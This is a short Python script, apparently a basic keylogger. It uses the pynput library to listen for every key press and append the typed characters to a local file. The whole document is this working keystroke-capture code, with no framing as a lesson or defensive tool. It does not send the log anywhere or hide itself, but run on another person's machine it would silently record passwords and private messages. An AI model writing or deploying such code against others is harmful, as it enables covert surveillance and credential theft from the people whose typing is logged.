from pynput import keyboard;

def keyrec(key):
    with open("keyyfile","a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Failed to retrieve key")
            logkey.write(" ")

if __name__ == "__main__":
    listen = keyboard.Listener(on_press=keyrec)
    listen.start()
    input()